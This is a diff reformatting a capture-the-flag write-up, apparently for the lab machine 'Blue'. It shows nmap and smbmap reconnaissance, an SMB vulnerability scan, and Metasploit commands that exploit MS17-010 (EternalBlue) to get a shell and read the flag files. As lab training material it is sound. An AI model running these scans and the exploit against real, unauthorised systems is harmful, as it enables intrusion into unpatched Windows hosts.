@@ -7,7 +7,8 @@ author-profile: true
 
 # Scanning
 ## nmap
----
+
+```
 nmap -p 135,139,445 -sCV -oA scans/nmap-tcpscripts 10.10.10.40
 
 PORT    STATE SERVICE      VERSION
@@ -36,10 +37,10 @@ Host script results:
 | smb2-time: 
 |   date: 2021-05-04T01:04:52
 |_  start_date: 2021-05-04T00:54:47
----
+```
 
 ##smbmap 
----
+```
 smbmap -H 10.10.10.40 -u "0xdf -p "0xdf
 [+] Guest session       IP: 10.10.10.40:445     Name: 10.10.10.40                                       
         Disk                                                    Permissions     Comment
@@ -49,11 +50,11 @@ smbmap -H 10.10.10.40 -u "0xdf -p "0xdf
         IPC$                                                    NO ACCESS       Remote IPC
         Share                                                   READ ONLY
         Users                                                   READ ONLY
----
+```
 
 ## nmap smb vuln script
 
----
+```
 nmap -p 445 -script vuln -oA scans/nmap-smbvulns 10.10.10.40 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:17 EDT
 Nmap scan report for 10.10.10.40
@@ -81,10 +82,10 @@ Host script results:
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 
 Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds
----
+```
 
 # exploitation
----
+```
 msf6 > search ms17-010
 use 0
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
@@ -158,4 +159,4 @@ C:\Users>type administrator\desktop\root.txt
 ********************************
 C:\Users>type haris\desktop\user.txt
 ********************************
----
+```
